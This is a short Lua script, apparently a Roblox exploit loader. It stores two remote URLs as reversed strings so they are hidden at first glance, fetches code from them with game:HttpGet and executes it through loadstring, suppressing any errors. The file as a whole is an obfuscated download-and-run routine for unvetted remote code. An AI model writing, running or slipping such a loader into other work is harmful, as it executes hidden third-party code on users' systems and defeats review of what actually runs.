--  first glance)
local rev1 = "redaol/ved.ronul//:sptth"
local rev2 = "aul.tpircS/niam/sdaeh/sfer/detadpU/tpircS-setadpU/moc.tnetnocresubuhtig.war//:sptth"

-- code
local urls = {
    string.reverse(rev1),
    string.reverse(rev2)
}

-- fetch
local codes = {}
for i, u in ipairs(urls) do
    local ok, res = pcall(function() return game:HttpGet(u) end)
    if ok and type(res) == "string" then
        codes[i] = res
    else
        warn(("Failed to fetch script %d (url: %s)"):format(i, tostring(u)))
    end
end

-- run them essentially
for i, c in ipairs(codes) do
    if c then
        task.spawn(function()
            local ok, err = pcall(function() loadstring(c)() end)
            if not ok then warn(("Script %d error: %s"):format(i, tostring(err))) end
        end)
    end
end
